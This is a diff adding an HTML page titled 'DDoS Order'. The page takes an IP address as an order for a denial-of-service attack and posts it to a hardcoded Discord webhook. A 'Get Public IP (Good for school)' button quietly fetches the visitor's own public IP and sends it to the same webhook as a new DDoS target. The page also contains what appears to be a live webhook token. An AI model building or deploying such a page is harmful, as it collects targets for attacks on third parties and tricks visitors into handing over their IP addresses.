@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DDoS Order</title>
+    <style>
+        body {
+            background: url('https://raw.githubusercontent.com/Enderkries2011/private-stuff/main/hacker.jpg');
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content:
+    </style>
+  </head>
+  <body>
+    <h1>DDoS Order</h1>
+    <input type="text" id="message" placeholder="Enter a IP">
+    <button onclick="sendMessage()">Submit</button>
+    <button onclick="getPublicIP()">Get Public IP (Good for school)</button>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        function sendMessage() {
+            const message = document.getElementById("message").value;
+            const webhookUrl = "https://discord.com/api/webhooks/1159172599369171004/Q7Te_0iX_Hp741DPSJmU0135buBA-7swSc6Onhr_Ya7nI1qIRQEDiGxT-PmhoV7gKyjD"; // Replace with your Discord webhook URL
+
+            // Check if a message is provided
+            if (message.trim() === "") {
+                alert("Please enter a IP.");
+                return;
+            }
+
+            // Create a data object
+            const data = {
+                content: `New ip To DDoS: ${message}`
+            };
+
+            // Send data to Discord webhook using Axios
+            axios.post(webhookUrl, data)
+                .then(response => {
+                    console.log("IP sent successfully:");
+                    alert("IP sent successfully!");
+                })
+                .catch(error => {
+                    console.error("Error sending IP:", error);
+                    alert("Error sending IP. Please try again later.");
+                });
+        }
+
+        function getPublicIP() {
+            let userIP;
+            fetch('https://api.ipify.org')
+                .then(res => res.text())
+                .then(ip => {
+                    userIP = ip;
+                    console.log('User IP:', userIP);
+                    sendIPToDiscord(userIP);
+                })
+                .catch(error => {
+                    console.error("Error getting public IP:", error);
+                    alert("Error getting public IP. Please try again later.");
+                });
+        }
+
+        function sendIPToDiscord(ipAddress) {
+            const webhookUrl = "https://discord.com/api/webhooks/1159172599369171004/Q7Te_0iX_Hp741DPSJmU0135buBA-7swSc6Onhr_Ya7nI1qIRQEDiGxT-PmhoV7gKyjD"; // Replace with your Discord webhook URL
+
+            // Create a data object
+            const data = {
+                content: `New ip To DDoS: ${ipAddress}`
+            };
+
+            // Send data to Discord webhook using Axios
+            axios.post(webhookUrl, data)
+                .then(response => {
+                    console.log("IP address sent successfully:", response.data);
+                    alert("IP address sent successfully!");
+                })
+                .catch(error => {
+                    console.error("Error sending IP address:", error);
+                    alert("Error sending IP address. Please try again later.");
+                });
+        }
+    </script>
+  </body>
+</html>
